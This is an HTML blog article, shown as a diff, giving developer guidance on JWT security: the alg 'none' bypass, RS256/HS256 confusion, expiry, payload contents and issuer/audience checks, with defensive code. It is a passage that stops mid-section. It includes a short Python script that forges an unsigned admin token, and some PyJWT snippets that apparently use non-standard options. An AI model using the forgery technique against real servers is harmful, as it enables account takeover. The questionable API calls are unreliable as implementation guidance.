@@ -1,0 +1,1142 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>JWT Security: Vulnerabilities, Best Practices and Implementation Guide (2026)</title>
+<meta name="description" content="A developer's guide to JWT security: the algorithm 'none' attack, RS256/HS256 confusion, sensitive data in payloads, token storage, refresh token rotation. 9 vulnerabilities explained with code. Written by Mathias Kouadio.">
+<meta name="keywords" content="jwt security vulnerabilities, algorithm none jwt attack, rs256 hs256 confusion, jwt best practices 2026, json web token guide, jwt refresh token rotation, jwt storage localstorage cookie, jwt payload sensitive data">
+<meta name="robots" content="index, follow">
+<meta name="author" content="Mathias Kouadio">
+<link rel="canonical" href="https://www.devstoolsbox.dev/tools/blog/jwt-security-guide/">
+<link rel="alternate" hreflang="en" href="https://www.devstoolsbox.dev/tools/blog/jwt-security-guide/">
+<link rel="alternate" hreflang="fr" href="https://www.devstoolsbox.dev/fr/blog/guide-securite-jwt/">
+<link rel="alternate" hreflang="x-default" href="https://www.devstoolsbox.dev/tools/blog/jwt-security-guide/">
+
+<meta property="og:title" content="JWT Security: Vulnerabilities, Best Practices and Implementation Guide (2026)">
+<meta property="og:description" content="9 JWT vulnerabilities explained with real examples, code in 5 languages, and the correct access + refresh token pattern.">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://www.devstoolsbox.dev/tools/blog/jwt-security-guide/">
+<meta property="og:site_name" content="DevToolbox">
+
+<script type="application/ld+json">
+{
+  "@context":"https://schema.org",
+  "@type":"Article",
+  "headline":"JWT Security: Vulnerabilities, Best Practices and Implementation Guide (2026)",
+  "author":{"@type":"Person","name":"Mathias Kouadio","url":"https://www.devstoolsbox.dev/about/"},
+  "datePublished":"2026-06-10",
+  "dateModified":"2026-06-10",
+  "mainEntityOfPage":"https://www.devstoolsbox.dev/tools/blog/jwt-security-guide/",
+  "publisher":{"@type":"Organization","name":"DevToolbox","url":"https://www.devstoolsbox.dev/"},
+  "description":"9 JWT vulnerabilities with real examples, secure implementation in 5 languages, refresh token rotation pattern, and token storage comparison."
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context":"https://schema.org",
+  "@type":"FAQPage",
+  "mainEntity":[
+    {"@type":"Question","name":"What is the algorithm 'none' vulnerability in JWT?","acceptedAnswer":{"@type":"Answer","text":"When a JWT specifies alg: none in its header, it carries no signature. Vulnerable servers that accept this algorithm without checking allow any attacker to forge tokens with arbitrary claims — including admin: true or an arbitrary user ID — simply by base64url-encoding their own header and payload without signing anything."}},
+    {"@type":"Question","name":"What is the RS256/HS256 algorithm confusion attack?","acceptedAnswer":{"@type":"Answer","text":"If a server normally verifies tokens with RS256 (asymmetric) but also accepts HS256 (symmetric), an attacker can sign a forged token using the server's public key as the HMAC secret. The server then verifies it using its own public key — and accepts the forged token. The fix: use a JWT library that requires you to specify an explicit algorithm allowlist."}},
+    {"@type":"Question","name":"Should I store JWT tokens in localStorage or cookies?","acceptedAnswer":{"@type":"Answer","text":"Never store JWT tokens in localStorage or sessionStorage. Any XSS vulnerability on your site gives an attacker access to every token stored there. The safest approach is memory (a JavaScript variable in a closure), which is wiped on page reload. For persistence across reloads, use an httpOnly, Secure, SameSite=Strict cookie for the refresh token, and keep the short-lived access token in memory."}},
+    {"@type":"Question","name":"What is refresh token rotation?","acceptedAnswer":{"@type":"Answer","text":"Refresh token rotation means issuing a new refresh token every time an access token is refreshed, and invalidating the old one. If a refresh token is stolen, the legitimate user's next use of their old token will fail (because it was already rotated), alerting them and the system to the compromise. This provides detection of token theft, which a non-rotating refresh token cannot provide."}},
+    {"@type":"Question","name":"Why should I never put sensitive data in a JWT payload?","acceptedAnswer":{"@type":"Answer","text":"JWT payloads are Base64url-encoded, not encrypted. Anyone who has the token can decode and read every field in the payload without knowing any secret key. Passwords, credit card numbers, and personal data should never appear in a JWT. If you need to transmit sensitive claims, use JWE (JSON Web Encryption) instead of JWS (signed JWT)."}},
+    {"@type":"Question","name":"What is a good expiration time for a JWT access token?","acceptedAnswer":{"@type":"Answer","text":"15 minutes is the most common recommendation for access tokens in security-sensitive applications. This limits the window of exploitation if a token is stolen. Pair this with a refresh token (7-30 days, stored in an httpOnly cookie) that can issue new access tokens without requiring the user to re-authenticate."}}
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context":"https://schema.org",
+  "@type":"BreadcrumbList",
+  "itemListElement":[
+    {"@type":"ListItem","position":1,"name":"Home","item":"https://www.devstoolsbox.dev/"},
+    {"@type":"ListItem","position":2,"name":"Blog","item":"https://www.devstoolsbox.dev/tools/blog/"},
+    {"@type":"ListItem","position":3,"name":"JWT Security Guide","item":"https://www.devstoolsbox.dev/tools/blog/jwt-security-guide/"}
+  ]
+}
+</script>
+
+<style>
+:root{
+  --bg:#f8fafc;--surface:#ffffff;--surface2:#f1f5f9;
+  --primary:#7c3aed;--primary-hover:#6d28d9;--primary-light:rgba(124,58,237,.08);
+  --text:#0f172a;--text2:#374151;--text3:#64748b;
+  --border:#e2e8f0;--shadow:0 4px 16px rgba(0,0,0,.06);
+  --radius:14px;--code-bg:#1e293b;--code-color:#e2e8f0;
+  --mono:'SF Mono','Menlo','Cascadia Code',monospace;
+  --pass:#10b981;--warn:#f59e0b;--fail:#ef4444;
+  --pass-bg:#d1fae5;--warn-bg:#fef3c7;--fail-bg:#fee2e2;
+  --jwt-h:#ec4899;--jwt-p:#7c3aed;--jwt-s:#10b981;
+}
+body.dark{
+  --bg:#0b0f19;--surface:#151a28;--surface2:#1d2333;
+  --primary:#a78bfa;--primary-hover:#8b5cf6;
+  --text:#f1f5f9;--text2:#cbd5e1;--text3:#94a3b8;
+  --border:#2d3548;--shadow:0 4px 16px rgba(0,0,0,.35);
+  --pass-bg:#064e3b;--warn-bg:#422006;--fail-bg:#450a0a;
+}
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth}
+body{font-family:'Inter',-apple-system,BlinkMacSystemFont,sans-serif;background:var(--bg);color:var(--text);line-height:1.75;padding:20px;min-height:100vh;transition:background .3s,color .3s;-webkit-font-smoothing:antialiased}
+.page{max-width:860px;margin:0 auto}
+
+.site-header{display:flex;justify-content:space-between;align-items:center;margin-bottom:24px;flex-wrap:wrap;gap:12px}
+.logo{font-weight:800;font-size:1.35rem;color:var(--primary);text-decoration:none;display:flex;align-items:center;gap:8px}
+.logo::before{content:'🛠️'}
+.header-controls{display:flex;gap:8px}
+.pill-group{background:var(--surface);border:1px solid var(--border);border-radius:40px;padding:3px;display:flex;box-shadow:var(--shadow)}
+.pill-btn{padding:6px 14px;border:none;background:transparent;font-weight:600;cursor:pointer;color:var(--text2);border-radius:32px;font-size:.8rem;transition:.18s;font-family:inherit;white-space:nowrap;text-decoration:none}
+.pill-btn.active{background:var(--primary);color:#fff}
+
+.breadcrumb{font-size:.8rem;color:var(--text3);margin-bottom:20px}
+.breadcrumb ol{list-style:none;display:flex;flex-wrap:wrap;gap:4px}
+.breadcrumb li{display:flex;align-items:center}
+.breadcrumb li+li::before{content:'/';margin:0 6px;color:var(--text3)}
+.breadcrumb a{color:var(--text2);text-decoration:none}
+.breadcrumb a:hover{color:var(--primary)}
+
+.article-card{background:var(--surface);border:1px solid var(--border);border-radius:var(--radius);padding:36px;box-shadow:var(--shadow);margin-bottom:32px}
+@media(max-width:600px){.article-card{padding:20px}}
+
+h1{font-size:2rem;font-weight:800;letter-spacing:-.025em;line-height:1.25;margin-bottom:10px}
+.article-meta{font-size:.85rem;color:var(--text3);margin-bottom:28px;display:flex;gap:14px;flex-wrap:wrap}
+.article-meta time{color:var(--text2);font-weight:500}
+.article-meta a{color:var(--primary);text-decoration:none}
+h2{font-size:1.5rem;font-weight:800;margin-top:44px;margin-bottom:12px;letter-spacing:-.015em;scroll-margin-top:24px}
+h3{font-size:1.15rem;font-weight:700;margin-top:28px;margin-bottom:8px;color:var(--text)}
+h4{font-size:1rem;font-weight:700;margin-top:20px;margin-bottom:6px;color:var(--text2)}
+p{color:var(--text2);margin-bottom:16px;font-size:.97rem;line-height:1.85}
+a{color:var(--primary);text-decoration:none}
+a:hover{text-decoration:underline}
+strong{color:var(--text)}
+ul,ol{margin-left:22px;margin-bottom:16px;color:var(--text2)}
+li{margin-bottom:7px;font-size:.97rem;line-height:1.75}
+code{background:var(--code-bg);color:var(--code-color);padding:2px 7px;border-radius:4px;font-family:var(--mono);font-size:.88em}
+pre{background:var(--code-bg);color:var(--code-color);padding:18px;border-radius:12px;overflow-x:auto;margin:18px 0;font-family:var(--mono);font-size:.82rem;line-height:1.65}
+pre code{background:transparent;padding:0;font-size:inherit;border-radius:0}
+
+.callout{padding:14px 18px;border-radius:0 12px 12px 0;margin:20px 0;font-size:.9rem;color:var(--text2);line-height:1.7}
+.callout-info{background:var(--primary-light);border-left:4px solid var(--primary)}
+.callout-warn{background:var(--warn-bg);border-left:4px solid var(--warn)}
+.callout-fail{background:var(--fail-bg);border-left:4px solid var(--fail)}
+.callout-pass{background:var(--pass-bg);border-left:4px solid var(--pass)}
+body.dark .callout-warn{background:#422006}
+body.dark .callout-fail{background:#450a0a}
+body.dark .callout-pass{background:#064e3b}
+.callout strong{color:var(--text)}
+
+.table-wrap{overflow-x:auto;-webkit-overflow-scrolling:touch;margin:20px 0;border-radius:12px}
+table{width:100%;border-collapse:collapse;min-width:520px}
+.dec-table{background:var(--pass-bg);border:2px solid var(--pass);border-radius:12px;overflow:hidden}
+.dec-table th,.dec-table td{padding:11px 14px;text-align:left;border-bottom:1px solid var(--border);font-size:.87rem}
+.dec-table th{background:var(--pass);color:#fff;font-weight:700;font-size:.8rem;text-transform:uppercase;letter-spacing:.05em}
+.dec-table tr:last-child td{border-bottom:none}
+.plain-table th,.plain-table td{border:1px solid var(--border);padding:9px 13px;text-align:left;font-size:.87rem}
+.plain-table th{background:var(--surface2);font-weight:700}
+
+/* JWT anatomy visual */
+.jwt-visual{font-family:var(--mono);font-size:.83rem;line-height:1.8;background:var(--surface2);border:1px solid var(--border);border-radius:12px;padding:18px;margin:18px 0;word-break:break-all}
+.jwt-h{color:var(--jwt-h);font-weight:700}
+.jwt-p{color:var(--jwt-p);font-weight:700}
+.jwt-s{color:var(--jwt-s);font-weight:700}
+.jwt-dot{color:var(--text3)}
+.jwt-legend{display:flex;gap:16px;flex-wrap:wrap;margin-top:10px;font-size:.8rem}
+.jwt-legend-item{display:flex;align-items:center;gap:6px}
+.jwt-legend-dot{width:10px;height:10px;border-radius:50%;flex-shrink:0}
+
+/* vulnerability cards */
+.vuln-card{border:1px solid var(--border);border-radius:12px;padding:20px;margin:16px 0}
+.vuln-card-header{display:flex;justify-content:space-between;align-items:flex-start;gap:12px;margin-bottom:12px}
+.vuln-name{font-weight:800;font-size:1rem;color:var(--text)}
+.sev-badge{font-size:.72rem;font-weight:800;padding:3px 10px;border-radius:99px;white-space:nowrap;text-transform:uppercase;letter-spacing:.05em;flex-shrink:0}
+.sev-critical{background:var(--fail-bg);color:var(--fail)}
+.sev-high{background:#fff0e8;color:#c2410c}
+.sev-medium{background:var(--warn-bg);color:#b45309}
+.sev-low{background:var(--pass-bg);color:var(--pass)}
+.sev-info{background:var(--primary-light);color:var(--primary)}
+body.dark .sev-high{background:#4a1a00;color:#fb923c}
+.vuln-card p{margin-bottom:10px}
+.vuln-card .fix-label{font-size:.78rem;font-weight:800;text-transform:uppercase;letter-spacing:.06em;color:var(--pass);margin-bottom:4px}
+
+/* storage comparison */
+.storage-row{display:grid;grid-template-columns:110px 1fr 1fr 1fr;gap:1px;background:var(--border);border-radius:8px;overflow:hidden;margin:16px 0}
+.storage-cell{background:var(--surface);padding:10px 12px;font-size:.83rem}
+.storage-cell.header{background:var(--surface2);font-weight:700;font-size:.78rem;text-transform:uppercase;letter-spacing:.05em;color:var(--text3)}
+.storage-cell.name{font-weight:700;color:var(--text);font-family:var(--mono);font-size:.8rem}
+.ok{color:var(--pass);font-weight:700}
+.bad{color:var(--fail);font-weight:700}
+.warn-text{color:var(--warn);font-weight:700}
+@media(max-width:600px){.storage-row{grid-template-columns:1fr}}
+
+/* code tabs */
+.lang-tabs{display:flex;gap:6px;flex-wrap:wrap;margin-bottom:-1px}
+.lang-tab{padding:6px 14px;border-radius:8px 8px 0 0;border:1px solid var(--border);border-bottom:none;background:var(--surface2);color:var(--text2);font-size:.78rem;font-weight:700;cursor:pointer;font-family:inherit;transition:.15s}
+.lang-tab.active{background:var(--code-bg);color:var(--code-color);border-color:var(--code-bg)}
+.code-block{display:none}
+.code-block.visible{display:block}
+.code-block pre{border-radius:0 12px 12px 12px;margin-top:0}
+
+/* sequence diagram (text-based) */
+.seq-diagram{background:var(--surface2);border:1px solid var(--border);border-radius:12px;padding:18px;font-family:var(--mono);font-size:.8rem;line-height:1.8;overflow-x:auto;margin:16px 0}
+.seq-step{color:var(--text2);margin-bottom:2px}
+.seq-step .seq-actor{color:var(--primary);font-weight:700}
+.seq-step .seq-arrow{color:var(--text3)}
+.seq-step .seq-label{color:var(--text)}
+.seq-comment{color:var(--text3);font-style:italic;margin-top:4px;margin-bottom:8px}
+
+.btn-cta{display:inline-block;background:var(--primary);color:#fff !important;padding:12px 24px;border-radius:40px;font-weight:700;font-size:.9rem;text-decoration:none !important;transition:.2s;margin:8px 0}
+.btn-cta:hover{background:var(--primary-hover);transform:translateY(-1px)}
+
+.faq-item{border-top:1px solid var(--border)}
+.faq-item:last-child{border-bottom:1px solid var(--border)}
+.faq-item summary{list-style:none;padding:13px 0;cursor:pointer;font-weight:600;color:var(--text);font-size:.93rem;display:flex;justify-content:space-between;align-items:center}
+.faq-item summary::-webkit-details-marker{display:none}
+.faq-item summary::after{content:'＋';font-size:.88rem;color:var(--text3);transition:transform .2s;flex-shrink:0;margin-left:16px}
+.faq-item[open] summary::after{transform:rotate(45deg)}
+.faq-item[open] summary{color:var(--primary)}
+.faq-answer{padding:0 0 13px;color:var(--text2);font-size:.9rem;line-height:1.85}
+
+.references{margin-top:36px;padding-top:20px;border-top:1px solid var(--border)}
+.references h3{font-size:.95rem;margin-bottom:12px;color:var(--text3);font-weight:700;text-transform:uppercase;letter-spacing:.06em}
+.ref-list{list-style:none;padding:0;margin:0;display:flex;flex-direction:column;gap:6px}
+.ref-list li{font-size:.83rem;color:var(--text3);display:flex;gap:8px}
+.ref-list li::before{content:'→';color:var(--primary);flex-shrink:0;margin-top:1px}
+.ref-list a{color:var(--primary)}
+
+.related-tools{background:var(--primary-light);border:1px solid rgba(124,58,237,.2);border-radius:12px;padding:18px 20px;margin-top:36px}
+.related-tools h3{font-size:.85rem;font-weight:800;color:var(--primary);text-transform:uppercase;letter-spacing:.06em;margin-bottom:10px}
+.related-tools ul{list-style:none;padding:0;margin:0;display:flex;flex-direction:column;gap:6px}
+.related-tools li a{font-size:.88rem;color:var(--text2)}
+.related-tools li a:hover{color:var(--primary)}
+
+.toc{background:var(--surface2);border:1px solid var(--border);border-radius:12px;padding:16px 20px;margin-bottom:28px}
+.toc-title{font-size:.78rem;font-weight:800;letter-spacing:.07em;text-transform:uppercase;color:var(--text3);margin-bottom:10px}
+.toc ol{margin-left:18px;margin-bottom:0}
+.toc li{font-size:.85rem;margin-bottom:4px}
+.toc a{color:var(--text2)}
+.toc a:hover{color:var(--primary)}
+
+.footer{text-align:center;padding:20px;border-top:1px solid var(--border);margin-top:24px;color:var(--text3);font-size:.8rem}
+.footer a{color:var(--primary);text-decoration:none}
+</style>
+</head>
+<body>
+<div class="page">
+
+<header class="site-header">
+  <a href="/" class="logo">DevToolbox</a>
+  <div class="header-controls">
+    <div class="pill-group">
+      <button class="pill-btn" id="themeBtn" onclick="toggleTheme()">🌙 Dark</button>
+    </div>
+    <div class="pill-group">
+      <a href="/tools/blog/jwt-security-guide/" class="pill-btn active">EN</a>
+      <a href="/fr/blog/guide-securite-jwt/" class="pill-btn">FR</a>
+    </div>
+  </div>
+</header>
+
+<nav class="breadcrumb" aria-label="Breadcrumb">
+  <ol>
+    <li><a href="/">Home</a></li>
+    <li><a href="/fr/blog/">Blog</a></li>
+    <li aria-current="page">JWT Security Guide</li>
+  </ol>
+</nav>
+
+<main>
+<article itemscope itemtype="https://schema.org/Article" class="article-card">
+  <meta itemprop="datePublished" content="2026-06-10">
+  <meta itemprop="dateModified" content="2026-06-10">
+
+  <h1 itemprop="headline">JWT Security: Vulnerabilities, Best Practices and Implementation Guide (2026)</h1>
+
+  <div class="article-meta">
+    <time datetime="2026-06-10">June 10, 2026</time>
+    <span>·</span>
+    <span>22 min read</span>
+    <span>·</span>
+    <span>By <a href="/tools/about/" itemprop="author" itemscope itemtype="https://schema.org/Person"><span itemprop="name">Mathias Kouadio</span></a></span>
+  </div>
+
+  <nav class="toc" aria-label="Table of contents">
+    <div class="toc-title">In this article</div>
+    <ol>
+      <li><a href="#incident">The Auth0 incident that changed how I read JWT documentation</a></li>
+      <li><a href="#anatomy">JWT anatomy: what you're actually sending</a></li>
+      <li><a href="#claims">Standard claims reference</a></li>
+      <li><a href="#vulnerabilities">9 vulnerabilities — with real attack scenarios</a></li>
+      <li><a href="#implementation">Secure implementation in 5 languages</a></li>
+      <li><a href="#token-pattern">The correct access + refresh token pattern</a></li>
+      <li><a href="#storage">Token storage: localStorage vs cookie vs memory</a></li>
+      <li><a href="#faq">Frequently asked questions</a></li>
+    </ol>
+  </nav>
+
+  <div itemprop="articleBody">
+
+  <!-- ══════════════════════════════════
+       SECTION 1 — INCIDENT
+  ══════════════════════════════════ -->
+  <h2 id="incident">The Auth0 incident that changed how I read JWT documentation</h2>
+
+  <p>In 2015, Tim McLean, a security researcher, published a disclosure that should have been impossible. He had found a way to authenticate as any user — including administrators — on applications using several popular JWT libraries, without knowing any secret key, without brute-forcing anything, and without any cryptographic attack. The method was almost embarrassingly simple.</p>
+
+  <p>He changed the <code>alg</code> field in the JWT header from <code>RS256</code> to <code>none</code>. Then he removed the signature. Then he changed his user ID in the payload to the admin's user ID. The server accepted the token.</p>
+
+  <p>This worked because the JWT libraries at the time — including early versions of Auth0's SDK and several others — were reading the algorithm from the token itself and using it for verification. An attacker who controls the token header also controls which algorithm the server uses to verify it. With <code>alg: none</code>, verification simply doesn't happen.</p>
+
+  <p>Auth0 patched the issue. So did most affected libraries. But the underlying lesson remains: <strong>JWT is not a black box that is secure by default</strong>. It is a format that can be implemented correctly or incorrectly, and the consequences of an incorrect implementation range from complete authentication bypass to silent information leakage. This article covers both extremes.</p>
+
+  <div class="callout callout-info">
+    <strong>Inspect your tokens:</strong> Paste any JWT into the <a href="/tools/jwt-decoder/">DevToolbox JWT Decoder & Security Analyzer</a> and get an instant security analysis — algorithm vulnerabilities, expiration checks, missing claims, sensitive data detection. Everything runs in your browser.
+  </div>
+
+  <!-- ══════════════════════════════════
+       SECTION 2 — ANATOMY
+  ══════════════════════════════════ -->
+  <h2 id="anatomy">JWT anatomy: what you're actually sending</h2>
+
+  <p>A JWT is three Base64url-encoded strings joined by dots. The colors below match the standard way JWT is visualized in documentation and debugging tools.</p>
+
+  <div class="jwt-visual">
+    <span class="jwt-h">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9</span><span class="jwt-dot">.</span><span class="jwt-p">eyJzdWIiOiJ1c2VyXzEyMyIsIm5hbWUiOiJBbGljZSIsInJvbGUiOiJ1c2VyIiwiaWF0IjoxNzQ5Mzc2ODAwLCJleHAiOjE3NDk0NjMyMDB9</span><span class="jwt-dot">.</span><span class="jwt-s">SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c</span>
+    <div class="jwt-legend">
+      <div class="jwt-legend-item"><div class="jwt-legend-dot" style="background:var(--jwt-h)"></div><span style="color:var(--jwt-h);font-weight:700">Header</span> — algorithm + type</div>
+      <div class="jwt-legend-item"><div class="jwt-legend-dot" style="background:var(--jwt-p)"></div><span style="color:var(--jwt-p);font-weight:700">Payload</span> — claims (readable by anyone)</div>
+      <div class="jwt-legend-item"><div class="jwt-legend-dot" style="background:var(--jwt-s)"></div><span style="color:var(--jwt-s);font-weight:700">Signature</span> — integrity proof</div>
+    </div>
+  </div>
+
+  <p>Decoded, the header above contains <code>{"alg":"HS256","typ":"JWT"}</code> and the payload contains <code>{"sub":"user_123","name":"Alice","role":"user","iat":1749376800,"exp":1749463200}</code>. You can decode both right now with a base64url decoder — no secret needed.</p>
+
+  <p>This is the most important thing to understand about JWTs, and the one that gets developers into trouble most often: <strong>the payload is encoded, not encrypted</strong>. Base64url is a reversible encoding, not a security mechanism. Anyone who intercepts or obtains a JWT can read every field in the payload without knowing the secret key. The signature only proves the token was issued by someone who knows the secret. It does not hide the content.</p>
+
+  <div class="callout callout-fail">
+    <strong>Never put sensitive data in a JWT payload.</strong> Passwords, credit card numbers, personal identity numbers, private API keys — none of these belong in a token. If any server, CDN, or log aggregator in your infrastructure stores tokens, that data is exposed.
+  </div>
+
+  <h3>How the signature works</h3>
+
+  <p>For HMAC algorithms (HS256, HS384, HS512), the signature is computed as:</p>
+
+  <pre><code>HMAC-SHA256(
+  secret_key,
+  base64url(header) + "." + base64url(payload)
+)</code></pre>
+
+  <p>For RSA/EC algorithms (RS256, ES256), the server signs with its private key and verifies with its public key. The critical difference: with HMAC, anyone who knows the secret can both create and verify tokens. With RSA, only the holder of the private key can create tokens — the public key can only verify them. This makes RSA algorithms much better suited for distributed systems where multiple services need to verify tokens but should not be able to issue them.</p>
+
+  <!-- ══════════════════════════════════
+       SECTION 3 — CLAIMS
+  ══════════════════════════════════ -->
+  <h2 id="claims">Standard claims reference</h2>
+
+  <p>RFC 7519 defines a set of registered claim names. None of them are mandatory by the spec, but several are critical for security. If your library doesn't validate <code>exp</code>, <code>iss</code>, and <code>aud</code> by default, configure it explicitly.</p>
+
+  <div class="table-wrap">
+    <table class="plain-table">
+      <thead>
+        <tr><th>Claim</th><th>Full name</th><th>Type</th><th>Security relevance</th><th>Missing → risk</th></tr>
+      </thead>
+      <tbody>
+        <tr><td><code>iss</code></td><td>Issuer</td><td>String</td><td>Who created the token</td><td>Cross-service token replay (token for service A accepted by service B)</td></tr>
+        <tr><td><code>sub</code></td><td>Subject</td><td>String</td><td>Who the token represents (usually user ID)</td><td>No identity binding</td></tr>
+        <tr><td><code>aud</code></td><td>Audience</td><td>String / Array</td><td>Who the token is intended for</td><td>Token for one service accepted by another</td></tr>
+        <tr><td><code>exp</code></td><td>Expiration Time</td><td>Unix timestamp</td><td>Token validity window</td><td>Token valid forever if stolen</td></tr>
+        <tr><td><code>nbf</code></td><td>Not Before</td><td>Unix timestamp</td><td>Token not valid before this time</td><td>Token usable before intended</td></tr>
+        <tr><td><code>iat</code></td><td>Issued At</td><td>Unix timestamp</td><td>Token creation time, enables age checks</td><td>Cannot determine token age or enforce max lifetime</td></tr>
+        <tr><td><code>jti</code></td><td>JWT ID</td><td>String (UUID)</td><td>Unique identifier, enables revocation and replay protection</td><td>Cannot revoke individual tokens; replay attacks possible</td></tr>
+      </tbody>
+    </table>
+  </div>
+
+  <!-- ══════════════════════════════════
+       SECTION 4 — VULNERABILITIES
+  ══════════════════════════════════ -->
+  <h2 id="vulnerabilities">9 vulnerabilities — with real attack scenarios</h2>
+
+  <p>These are the vulnerabilities that appear most often in JWT security audits and CTF challenges. Each one has a real documented history. I've ordered them by severity and included the exact mechanism so you understand why it works, not just that it does.</p>
+
+  <!-- VULN 1 -->
+  <div class="vuln-card">
+    <div class="vuln-card-header">
+      <div class="vuln-name">1. Algorithm "none" — authentication bypass</div>
+      <span class="sev-badge sev-critical">Critical</span>
+    </div>
+    <p>Documented in CVE-2015-9235. The attack: change <code>"alg":"HS256"</code> to <code>"alg":"none"</code> in the header, remove the signature, modify any claim in the payload. Vulnerable servers read the algorithm from the token and skip verification entirely.</p>
+    <pre><code># Forged token construction (for educational purposes)
+import base64, json
+
+header = {"alg": "none", "typ": "JWT"}
+payload = {"sub": "admin", "role": "administrator", "exp": 9999999999}
+
+def b64url(data: dict) -> str:
+    return base64.urlsafe_b64encode(
+        json.dumps(data, separators=(',',':')).encode()
+    ).rstrip(b'=').decode()
+
+forged = f"{b64url(header)}.{b64url(payload)}."  # Empty signature
+print(forged)</code></pre>
+    <div class="fix-label">Fix</div>
+    <p>Never read the algorithm from the token. Hardcode the expected algorithm in your verification code. Use a library that requires an explicit <code>algorithms</code> parameter and rejects <code>none</code>.</p>
+    <pre><code># Python — PyJWT secure configuration
+import jwt
+
+# ❌ Vulnerable: algorithm from token header
+decoded = jwt.decode(token, key, algorithms=jwt.get_algorithms_for_key(key))
+
+# ✅ Correct: explicit allowlist, none is never acceptable
+decoded = jwt.decode(
+    token, key,
+    algorithms=["HS256"],  # Only accept exactly this algorithm
+    options={"verify_alg": True}
+)</code></pre>
+  </div>
+
+  <!-- VULN 2 -->
+  <div class="vuln-card">
+    <div class="vuln-card-header">
+      <div class="vuln-name">2. RS256 → HS256 algorithm confusion</div>
+      <span class="sev-badge sev-critical">Critical</span>
+    </div>
+    <p>If a server normally uses RS256 but also accepts HS256, an attacker who has obtained the server's public key (often available at <code>/.well-known/jwks.json</code>) can sign a forged token using that public key as the HMAC secret. The server then verifies it using its own public key — and accepts the token.</p>
+    <p>The reason this works: an RS256 public key is a long string. If the server's library accepts HS256 tokens and is given the verification "key" for RS256, it might use that public key string as the HMAC secret for HS256 verification. Attacker signs with the same string. Verification passes.</p>
+    <div class="fix-label">Fix</div>
+    <p>Maintain a strict algorithm allowlist. Never mix symmetric and asymmetric algorithms on the same endpoint. If you use RS256, only accept RS256.</p>
+    <pre><code>// Node.js — jsonwebtoken secure configuration
+const jwt = require('jsonwebtoken');
+const fs  = require('fs');
+
+const PUBLIC_KEY = fs.readFileSync('./keys/public.pem');
+
+// ❌ Vulnerable: accepts both algorithms
+const decoded = jwt.verify(token, PUBLIC_KEY);  // No algorithm restriction
+
+// ✅ Correct: explicit asymmetric algorithm only
+const decoded = jwt.verify(token, PUBLIC_KEY, {
+  algorithms: ['RS256']  // Reject HS256 even if the header requests it
+});</code></pre>
+  </div>
+
+  <!-- VULN 3 -->
+  <div class="vuln-card">
+    <div class="vuln-card-header">
+      <div class="vuln-name">3. No expiration claim (exp)</div>
+      <span class="sev-badge sev-high">High</span>
+    </div>
+    <p>A JWT without an <code>exp</code> claim is valid forever. If the token is logged, cached, leaked in a URL, or stored in a database backup — it will still work years later. Token theft becomes a permanent compromise rather than a temporary one.</p>
+    <div class="fix-label">Fix</div>
+    <p>Always set <code>exp</code>. 15 minutes for access tokens in security-sensitive applications. Pair with a refresh token for longer sessions. Your library should validate <code>exp</code> by default — verify this in the documentation and test it explicitly.</p>
+    <pre><code>from datetime import datetime, timedelta, timezone
+import jwt, uuid
+
+def create_access_token(user_id: str, secret: str) -> str:
+    now = datetime.now(timezone.utc)
+    payload = {
+        "sub":  user_id,
+        "iss":  "https://auth.yourapp.com",
+        "aud":  "https://api.yourapp.com",
+        "iat":  now,
+        "exp":  now + timedelta(minutes=15),  # Short-lived
+        "jti":  str(uuid.uuid4()),            # Unique ID for replay prevention
+    }
+    return jwt.encode(payload, secret, algorithm="HS256")</code></pre>
+  </div>
+
+  <!-- VULN 4 -->
+  <div class="vuln-card">
+    <div class="vuln-card-header">
+      <div class="vuln-name">4. Expiration too long (> 24 hours)</div>
+      <span class="sev-badge sev-medium">Medium</span>
+    </div>
+    <p>An access token valid for 24 hours or 30 days gives an attacker a long window of exploitation after theft. A stolen token that expires in 15 minutes becomes useless quickly. One valid for 30 days gives the attacker a month of access to the account — including the ability to change the email, reset the password, and lock out the legitimate user.</p>
+    <div class="fix-label">Fix</div>
+    <p>Use short-lived access tokens (15 minutes) paired with a refresh token. The refresh token can be longer-lived (7–30 days) but must be stored in an httpOnly cookie, not accessible to JavaScript.</p>
+  </div>
+
+  <!-- VULN 5 -->
+  <div class="vuln-card">
+    <div class="vuln-card-header">
+      <div class="vuln-name">5. Sensitive data in payload</div>
+      <span class="sev-badge sev-high">High</span>
+    </div>
+    <p>I've seen this in production code from experienced developers: passwords hashed or unhashed, full credit card numbers "because they're hashed anyway," personal identity numbers, internal API keys. The JWT payload is Base64url-encoded — it is not encrypted. Anyone who obtains the token can read every field without any key.</p>
+    <div class="fix-label">Fix</div>
+    <p>Store in the payload: user ID, role, session metadata, issued-at timestamp. Never store: passwords (even hashed), financial data, personal identity numbers, private keys, or any data you would not want displayed publicly. If you need to transmit encrypted claims, use <strong>JWE (JSON Web Encryption)</strong> — a different standard that does provide confidentiality.</p>
+    <pre><code># What belongs in a JWT payload
+payload_correct = {
+    "sub":   "user_abc123",       # Non-guessable user identifier
+    "role":  "user",              # Role for authorization
+    "email": "alice@example.com", # Only if needed for the token's purpose
+    "iat":   1749376800,
+    "exp":   1749377700,
+}
+
+# What does NOT belong in a JWT payload
+payload_wrong = {
+    "sub":         "user_abc123",
+    "password":    "$2b$12$...",   # ❌ Password hash — never
+    "card_number": "4242424242...",# ❌ Financial data — never
+    "ssn":         "123-45-6789", # ❌ PII — never
+    "api_key":     "sk-live-...", # ❌ Credentials — never
+}</code></pre>
+  </div>
+
+  <!-- VULN 6 -->
+  <div class="vuln-card">
+    <div class="vuln-card-header">
+      <div class="vuln-name">6. Missing issuer (iss) and audience (aud) validation</div>
+      <span class="sev-badge sev-high">High</span>
+    </div>
+    <p>In a microservices architecture where several services each issue JWTs, a token issued by Service A for its own users might be accepted by Service B if <code>iss</code> and <code>aud</code> are not validated. An attacker who can obtain a token from a lower-privilege service might replay it against a higher-privilege one.</p>
+    <div class="fix-label">Fix</div>
+    <p>Always verify <code>iss</code> against an expected issuer and <code>aud</code> against the current service's identifier. Most JWT libraries accept these as verification parameters.</p>
+    <pre><code># Python — verify issuer and audience explicitly
